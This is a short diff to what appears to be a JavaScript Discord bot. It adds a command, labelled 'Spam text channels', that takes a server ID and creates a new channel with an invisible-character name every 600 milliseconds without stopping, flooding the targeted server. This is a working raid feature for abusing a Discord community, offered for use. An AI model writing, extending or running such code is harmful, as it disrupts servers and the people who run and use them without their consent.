@@ -68,6 +68,15 @@ client.on('message', message => {
             });                
         }
         
+        // Spam text channels
+        if (args[0] == prefix + 'channels') {
+            var serverid = args[1];
+            let guild = client.guilds.get(serverid);
+            var interval = setInterval(function () {
+                guild.createChannel(name, "឵឵឵   ");
+            }, 600);
+        }
+        
         // Restart bot
         if (args[0] == prefix + 'restart') {
                require("child_process").spawn(process.argv.shift(), process.argv, {
